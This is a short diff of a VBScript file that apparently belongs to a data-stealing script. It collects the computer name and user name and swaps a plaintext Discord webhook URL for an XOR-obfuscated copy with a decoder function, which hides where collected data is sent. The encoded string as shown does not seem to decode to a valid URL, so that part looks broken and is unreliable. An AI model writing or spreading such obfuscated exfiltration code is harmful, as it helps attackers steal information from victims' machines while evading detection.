@@ -7,7 +7,14 @@ On Error Resume Next
 Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW"
+Function D(s)
+    Dim i, r: r = ""
+    For i = 1 To Len(s)
+        r = r & Chr(Asc(Mid(s, i, 1)) Xor 7)
+    Next
+    D = r
+End Function
+WH = D("}ozxw2((yywvjyr5jv{5hg5~lmzvvkw2x|`q~kgtov|z|y|~x3*3Bz7VnhSluFzngFz3j}3VnhSluFzngFl3Bz7Vn3h;]yM;t}]y3h^lvtwpzu3hS3slJhVnhC}SluSps3he3S_3yqfn3hC3Huz3h8FYhT3hJv}p3h@3h}7Fnh7Fz3h#u3hB3h<3h]7Fz3h#3h?3h=3h")
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
